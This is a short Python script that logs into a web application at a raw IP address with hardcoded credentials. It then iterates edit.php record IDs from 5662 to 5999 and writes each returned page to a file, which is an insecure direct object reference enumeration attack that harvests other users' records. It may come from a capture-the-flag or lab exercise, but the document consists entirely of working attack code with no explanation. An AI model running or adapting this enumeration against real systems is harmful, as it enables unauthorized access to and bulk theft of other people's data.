import requests
import time

login = {'username':'late2','password':'1234'}
s = requests.session()

r = s.post('http://128.238.66.224/login.php', data=login)
print r.status_code
print r.text

time.sleep(1)

out_result = open('result.txt', 'a')
for x in range(5662,6000):
	r = s.get("http://128.238.66.224/edit.php?id=%d" % x)
	if r.status_code == 200:
		print "Request %d ok" % x
		out_result.write("Request %d\n" % x)
		out_result.write(r.text+"\n")
	else:
		print "Something went wront:"
		print r.status_code
		print r.text
		break
	time.sleep(0.2)
out_result.close()